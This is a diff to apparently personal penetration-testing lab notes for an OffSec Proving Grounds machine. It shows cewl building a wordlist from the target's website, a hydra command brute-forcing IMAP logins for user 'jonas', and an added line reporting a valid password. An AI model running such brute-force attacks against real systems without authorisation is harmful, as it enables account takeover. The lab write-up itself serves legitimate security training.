@@ -51,8 +51,12 @@ is not working so I generate wordlists from https website.
 cewl -d 4 https://192.168.247.140 -w ~/Documents/OffSecPG/Hepet/wordlists.txt
 ```
 
-Only the IMAP service found is suitable for enumeration. Other services will block brute-force attacks
+Only the IMAP service found is suitable for enumeration. Other services will block brute-force attacks.
 
 ```
 hydra -l jonas -P ~/Documents/OffSecPG/Hepet/wordlists.txt 192.168.247.140 -s 143 imap
 ```
+
+Getting a vaild passowd successfully.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.25_23h51m41s_001_.png)
